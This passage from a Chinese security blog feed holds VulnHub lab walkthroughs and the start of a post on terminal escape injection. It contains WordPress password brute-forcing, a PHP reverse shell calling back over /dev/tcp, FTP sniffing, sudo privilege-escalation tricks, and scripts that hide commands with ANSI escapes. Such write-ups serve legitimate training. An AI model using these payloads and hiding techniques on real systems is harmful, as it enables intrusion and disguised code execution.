+<p><img src="2020-02-26-15-21-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-21-50屏幕截图"> <img src="2020-02-26-15-22-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-22-25屏幕截图"> </p>
+<p>逐一访问，无有价值信息，<code>wpscan</code> 枚举出了几个用户名：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure>
+
+<p>尝试枚举爆破，枚举出两个密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.117 -U tmp/user.txt -P /usr/share/wordlists/rockyou.txt -t 30</span><br><span class="line"></span><br><span class="line"><span class="comment"># [SUCCESS] - barney / spooky1                                                                 </span></span><br><span class="line"><span class="comment"># [SUCCESS] - stephen / apollo1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-26-15-53-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-53-05屏幕截图"> </p>
+<p><img src="2020-02-26-16-37-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-16-37-11屏幕截图"> </p>
+<h2 id="撬开大门"><a href="#撬开大门" class="headerlink" title="撬开大门"></a>撬开大门</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney ： spooky1   </span><br><span class="line">stephen ： apollo1</span><br></pre></td></tr></table></figure>
+
+<p>两个账号均可登录后台，不过 <code>stephen</code> 无利用点</p>
+<p><code>barney</code> 登陆后，有三个插件，搜索相关漏洞，除第三个插件外，其他暂无价值：</p>
+<p>根据 <code>PoC</code> 说明，写出 <code>exp</code> ，上传后，本地端口监听，访问上传网址，得到 <code>shell</code>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.109/8848 0&gt;&amp;1'"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>注意：用 <code>echo</code> 写入的时候注意引号的转义，写入后最好再查看一遍利用脚本的内容是否正确</p>
+<p><img src="2020-02-26-17-37-01%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-01屏幕截图"></p>
+<p><img src="2020-02-26-17-37-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-18屏幕截图"> <img src="2020-02-26-17-34-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="被忽略的转义"></p>
+<h2 id="登堂入室"><a href="#登堂入室" class="headerlink" title="登堂入室"></a>登堂入室</h2><p>接收到了 <code>shell</code> 先收集一波信息，最喜欢的 <code>/etc/passwd</code> 里总是包含用户及其主目录，<code>HOME</code> 下的用户目录无访问权限</p>
+<p>各种信息收集了一波，当前用户的作用实在不大。无思路无目的时候，就是收集的情报不够，整理一下现有资料：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e					无相关漏洞</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))	无相关漏洞</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK</span><br><span class="line"><span class="comment">######################</span></span><br><span class="line">barney		:x:1001:1001:Barney Sumner:/home/barney:/bin/bash</span><br><span class="line">stephen		:x:1002:1002:Stephen Morris:/home/stephen:/bin/bash</span><br><span class="line">peter		:x:1003:1003:Peter Hook:/home/peter:/bin/bash</span><br><span class="line">gillian		:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bash</span><br><span class="line">richard		:x:1005:1005:Richard Starkey:/home/richard:/bin/bash</span><br><span class="line">paul		:x:1006:1006:Paul McCartney:/home/paul:/bin/bash</span><br><span class="line">john		:x:1007:1007:John Lennon:/home/john:/bin/bash</span><br><span class="line">george		:x:1008:1008:George Harrison:/home/george:/bin/bash</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">得到密码的两个账号无法登陆 FTP</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################									&lt;----- 未验证/未收集</span></span><br><span class="line">Linux kernel 信息未收集（内核提权）</span><br><span class="line">FTP 没有起到作用（存在即有理）</span><br><span class="line"></span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">两个账户存在于 /etc/passwd 下，是否可以切换用户</span><br><span class="line">barney 密码错误</span><br><span class="line">stephen 可以切换</span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK	su：NO</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK	su：OK	&lt;----- 切入点</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-26-17-38-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-38-13屏幕截图"></p>
+<h2 id="身份转换"><a href="#身份转换" class="headerlink" title="身份转换"></a>身份转换</h2><p><code>su stephen</code> ：切换用户</p>
+<p>不存在 <code>sudo</code> 权限，主目录暂无利用信息，卡住了</p>
+<p>查了一下 WriteUp，抓 <code>FTP</code> 的包，有明文密码：</p>
+<p>查看相关进程：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux | grep <span class="string">"ftp"</span></span><br><span class="line"></span><br><span class="line">systemd+  1376  0.0  0.9 119972  9484 pts/0    Ss+  02:32   0:00 proftpd: (accepting connections)</span><br><span class="line">paul      2883  0.0  0.0   2600   732 ?        Ss   05:38   0:00 /bin/sh -c /home/paul/ftp_upload.sh &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">paul      2884  0.0  0.0   2600   864 ?        S    05:38   0:00 /bin/sh /home/paul/ftp_upload.sh</span><br><span class="line">paul      2885  0.0  0.2   3224  2036 ?        S    05:38   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2886  0.0  0.8 133072  8136 pts/0    S+   05:38   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2889  0.0  0.0   6296   924 pts/0    S+   05:38   0:00 grep ftp</span><br></pre></td></tr></table></figure>
+
+<p>查看 FTP 监听的网卡：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">3: br-eca3858d86bf: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:9e:df:8d:0f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-eca3858d86bf</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:9eff:fedf:8d0f/64 scope link</span><br></pre></td></tr></table></figure>
+
+<p>抓包，得到密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timeout 50 tcpdump -i br-eca3858d86bf -w pack.pcap</span><br><span class="line">tcpdump -r pack.pcap</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-27-13-39-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 13-39-28屏幕截图"> </p>
+<p><img src="2020-02-27-14-40-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-40-50屏幕截图"> </p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>登录 <code>paul</code> 查看可以 <code>sudo</code> 执行的程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: /usr/sbin/service</span><br></pre></td></tr></table></figure>
+
+<p><code>/usr/sbin/service</code> 提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u peter service ../../bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>查看可以 <code>sudo</code> 执行的程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: /usr/bin/passwd</span><br></pre></td></tr></table></figure>
+
+<p>修改 <code>root</code> 密码，登录 <code>root</code> 查看 <code>flag</code> ：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line">su -</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-02-27-14-54-14%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-54-14屏幕截图"> </p>
+<hr>
+<p>卡在了 <code>FTP</code> 抓包的位置，还是经验不足</p>
+<p>前期收集的信息必定是有用的，<code>FTP</code> 使用明文传输密码，只需要抓包，就可以得到</p>
+<p>查看系统正在运行的进程也要加入信息收集里面</p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LiterallyVulnerable</title>
+    <url>/2020/03/19/LiterallyVulnerable/</url>
+    <content><![CDATA[<blockquote>
+<p>2020-03-08 14:26 — 2020-03-09</p>
+</blockquote>
+<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Flags</span>: <span class="number">3</span> (local.txt, user.txt &amp; root.txt)</span><br><span class="line">Difficulty <span class="attribute">Level</span>: Initial Shell (Easy) - Privileges Escalation (Intermediate)</span><br><span class="line"><span class="attribute">Website</span>: <span class="attribute">https</span>:<span class="comment">//ebryx.com</span></span><br><span class="line"><span class="attribute">Hint</span>: Maybe, you hasted and left some open holes unchecked?</span><br><span class="line">Literally Vulnerable is supposed to give beginners a taste of real-world scenarios and OSCP machines at the same time! It was inspired highly by the <span class="variable">@DC</span> series.</span><br><span class="line"></span><br><span class="line">You're supposed to know the big three (EEEs) Enumeration, Exploitation &amp; Escalation of pentesting to pwn the machine. The machine is supposed to be beginner-friendly and the difficulty level is Easy-Intermediate depending on your knowledge. You need to have enough information about Linux file types &amp; permissions for privileges escalation.</span><br><span class="line"></span><br><span class="line">Technical <span class="attribute">Information</span>:</span><br><span class="line">Just download, extract and load the .vmx file in VMware Workstation (tested on VMware Workstation <span class="number">15</span>.x.x)</span><br><span class="line">The adapter is currently NAT, networking is configured for DHCP and IP will get assigned automatically</span><br><span class="line"><span class="attribute">Contact</span>:</span><br><span class="line">You can either contact me on twitter <span class="variable">@syed__umar</span> or linkedin (/in/syedumararfeen/) for hints!</span><br><span class="line">There are three flags in the <span class="attribute">machine</span>: local.txt, user.txt &amp; root.txt. You're supposed to grab all three in order to completely pwn the machine. Hope you like the machine, best of luck! :)</span><br><span class="line"></span><br><span class="line">I'll try my best to continue with the series!</span><br><span class="line">--------</span><br><span class="line"><span class="attribute">From </span>: <span class="attribute">https</span>:<span class="comment">//www.vulnhub.com/entry/ua-literally-vulnerable,407/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali：172.16.252.129</span><br><span class="line">目标：172.16.252.1/24</span><br></pre></td></tr></table></figure>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -sn -T5 -v 172.16.252.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<p>目标端口服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n -Pn -sV -O 172.16.252.131</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure>
+
+<p>全部端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">21/tcp open ftp vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r-- 1 ftp ftp 325 Dec 04 13:05 backupPasswords </span><br><span class="line">| ftp-syst:</span><br><span class="line">| 	STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">| Connected to ::ffff:172.16.252.129</span><br><span class="line">| Logged <span class="keyword">in</span> as ftp</span><br><span class="line">| TYPE: ASCII</span><br><span class="line">| No session bandwidth <span class="built_in">limit</span></span><br><span class="line">| Session timeout <span class="keyword">in</span> seconds is 300</span><br><span class="line">| Control connection is plain text</span><br><span class="line">| Data connections will be plain text</span><br><span class="line">| At session startup, client count was 1</span><br><span class="line">| vsFTPd 3.0.3 - secure, fast, stable </span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)</span><br><span class="line">| 256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA) </span><br><span class="line">|_ 256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Not so Vulnerable &amp;<span class="comment">#8211; Just another WordPress site </span></span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br></pre></td></tr></table></figure>
+
+<p>开启的端口：21、22、80、65535</p>
+<h3 id="FTP-匿名登陆"><a href="#FTP-匿名登陆" class="headerlink" title="FTP 匿名登陆"></a>FTP 匿名登陆</h3><p>FTP 可以匿名访问，得到几个密码，暂不知用途：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*<span class="variable">$eGRIf7v38s</span>&amp;p7 </span><br><span class="line">yP$*SV09YOrx7mY </span><br><span class="line">GmceC&amp;oOBtbnFCH </span><br><span class="line">3!IZguT2piU8X<span class="variable">$c</span> </span><br><span class="line">P&amp;s%F1D4<span class="comment">#KDBSeS</span></span><br><span class="line"><span class="variable">$EPid</span>%J2L9LufO5 </span><br><span class="line">nD!mb*aHON&amp;76&amp;G </span><br><span class="line">$*Ke7q2ko3tqoZo </span><br><span class="line">SCb<span class="variable">$I</span>^gDDqE34fA </span><br><span class="line">Ae%tM0XIWUMsCLp</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-14-48-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-48-33屏幕截图"></p>
+<p> <img src="2020-03-08-14-49-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-49-20屏幕截图">  </p>
+<h3 id="Web-目录枚举"><a href="#Web-目录枚举" class="headerlink" title="Web 目录枚举"></a>Web 目录枚举</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">80/tcp open http nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: WordPress 5.3</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: <span class="keyword">Not</span> so Vulnerable &amp;#8211; Just another WordPress site </span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">65535/tcp open http </span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu<span class="built_in"> Default </span>Page: It works</span><br></pre></td></tr></table></figure>
+
+<p>80 端口： nginx + Wordpress</p>
+<p>65535端口：Apache</p>
+<p>控制台显示资源请求错误多，可以看到它是从 <code>literally.vulnerable</code> 请求资源，可以设置 DNS：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"172.16.252.131    literally.vulnerable"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-14-54-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08 14-54-43屏幕截图"></p>
+<p>先扫描 65535 端口，逐一访问，得到 <code>phpcms</code> 页面，访问需要密码，<code>wpsacn</code> 枚举</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u <span class="string">"http://172.16.252.131:65535"</span> -e php --random-agents -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-15-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-15-13-12屏幕截图"> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ --enumerate</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] maybeadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] notadmin</span><br><span class="line">| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
+
+<p>得到两个用户名，使用前面得到的几个密码枚举爆破，碰运气，得到一组用户名密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.252.131:65535/phpcms/ -U users.txt -P backupPasswords</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[i] Valid Combinations Found:</span><br><span class="line">| Username: maybeadmin, Password:<span class="variable">$EPid</span>%J2L9LufO5</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-16-25-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-25-38屏幕截图"></p>
+<h3 id="登录-Wordpress-后台"><a href="#登录-Wordpress-后台" class="headerlink" title="登录 Wordpress 后台"></a>登录 Wordpress 后台</h3><p>都翻了一遍，得到一组用户名和密码：</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">notadmin:Pa<span class="symbol">$</span><span class="symbol">$</span>w0rd13!&amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-08-16-41-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-08-16-41-43屏幕截图"> </p>
+<h2 id="登录系统-Getshell"><a href="#登录系统-Getshell" class="headerlink" title="登录系统(Getshell)"></a>登录系统(Getshell)</h2><p>利用 <code>MSF</code> 上传木马 getshell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/unix/webapp/wp_admin_shell_upload</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-18-18-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-18-18-23屏幕截图"></p>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer : literallyvulnerable</span><br><span class="line">OS : Linux literallyvulnerable 4.15.0-88-generic <span class="comment">#88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">######## lsb_release #############</span></span><br><span class="line">www-data@literallyvulnerable:$ lsb_release -a lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description: Ubuntu 18.04.3 LTS</span><br><span class="line">Release: 18.04</span><br><span class="line">Codename: bionic</span><br><span class="line"></span><br><span class="line"><span class="comment">####### /etc/passwd #######</span></span><br><span class="line">doe:x:1001:1001:Doe,,,:/home/doe:/bin/bash </span><br><span class="line">john:x:1000:1000:,,,:/home/john:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>寻找 SUID 程序，得到可疑文件：<code>itseasy</code> </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-19-27-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-27-43屏幕截图"> </p>
+<h2 id="权限提升-User"><a href="#权限提升-User" class="headerlink" title="权限提升(User)"></a>权限提升(User)</h2><p>运行 <code>itseasy</code> 得到当前目录绝对路径，看过一篇通过操控 <code>PATH</code> 参数值进行提权；怀疑程序调用了 <code>pwd</code> 命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">cp /bin/bash /tmp/<span class="built_in">pwd</span>    <span class="comment"># or echo "/bin/bash" &gt; /tmp/pwd</span></span><br><span class="line">chmod 777 /tmp/<span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>执行后，没有得到预期的结果</p>
+<p><code>objdump -d</code> 一下，看到个 <code>getenv</code> 函数，用来获取环境变量</p>
+<p>也就是可以通过改变环境变量的值来控制这个程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PWD=\$\(/bin/bash\)</span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-20-28-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-28-54屏幕截图"> </p>
+<p><img src="2020-03-09-19-42-16%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-42-16屏幕截图"></p>
+<p>然后输入命令没有回显了，直接 SSH ：kali 下生成 ssh 公钥上传到目标机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/john/.ssh &amp;&amp; wget http://172.16.252.129:8848/autorized_keys</span><br></pre></td></tr></table></figure>
+
+<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>HOME 目录下的到一个 base64加密的密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">am9objpZWlckczhZNDlJQiNaWko= </span><br><span class="line"><span class="built_in">echo</span><span class="string">"am9objpZWlckczhZNDlJQiNaWko="</span>| base64 -d </span><br><span class="line"></span><br><span class="line">john:YZW<span class="variable">$s8Y49IB</span><span class="comment">#ZZJ</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="2020-03-09-19-54-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-19-54-52屏幕截图"> </p>
+<p><img src="2020-03-09-20-02-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-02-37屏幕截图"> </p>
+<p><img src="2020-03-09-20-05-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-05-51屏幕截图"></p>
+<p>搜索 SUID 程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find/ -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudopasswd root</span><br><span class="line">Sorry, user john is not allowed to execute <span class="string">'/usr/bin/passwd root'</span> as root on literallyvulnerable.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries forjohn on literallyvulnerable:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/</span><br><span class="line">sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">    User john may run the following commands on literallyvulnerable: </span><br><span class="line">        (root) /var/www/html/test.html</span><br></pre></td></tr></table></figure>
+
+<p>可以运行 <code>/var/www/html/test.html</code> </p>
+<h2 id="权限提升-root"><a href="#权限提升-root" class="headerlink" title="权限提升(root)"></a>权限提升(root)</h2><p><code>/var/www/html</code> 目录下没有 <code>test.html</code> 文件，且 <code>john</code> 没有 <code>html</code> 目录的写权限，那就切换回 <code>www-data</code> 用户创建文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; test.html</span><br><span class="line">chmod 777 test.html</span><br></pre></td></tr></table></figure>
+
+<p><code>sudo</code> 运行，提权成功</p>
+<p><img src="2020-03-09-20-19-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-19-09屏幕截图"></p>
+<p><img src="2020-03-09-20-21-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-25屏幕截图"> </p>
+<p><img src="2020-03-09-20-21-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-09-20-21-43屏幕截图"> </p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+        <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Terminal Escape Injection</title>
+    <url>/2020/04/21/Terminal-Escape-Injection/</url>
+    <content><![CDATA[<p><img src="2020-04-22-10.33.50.gif" alt="2020-04-22-10.33.50"></p>
+<br>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"evil!"</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!"</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2Aecho <span class="string">"Hello World!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">open /System/Applications/Calculator.app</span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">^[[2A^[[Kecho <span class="string">"Hello World"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>查看文件内容时(<code>cat</code>、<code>tail</code>)，命令遇到了转义字符并执行了转义改变了光标的位置，转义所在行的内容覆盖了(执行转义)转义指定处的内容，呈现在用户眼前的是覆盖后的样子；此脚本被执行，程序正常执行包括恶意代码在内到 <code>exit</code> 的所有内容。看到的内容和执行的内容不同</p>
+<p>恶意代码的长度若是超出伪装字符，会出现如下情况（那就<code>^[[K</code>擦除行）：</p>
+<p><img src="https://gitee.com/t_mouse/BlogPics/raw/master/uPic/Images/2020-04-21-22-%E6%88%AA%E5%B1%8F2020-04-21%2022.03.22-zU0amB.png" alt="超出伪装字符"></p>
+<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ul>
+<li>任意代码执行（ACE）</li>
+<li>在我们的系统上安装后门(RAT)</li>
+<li>在我们的系统中植入恶意软件或rootkit</li>
+<li>捕捉按键，记录我们的屏幕</li>
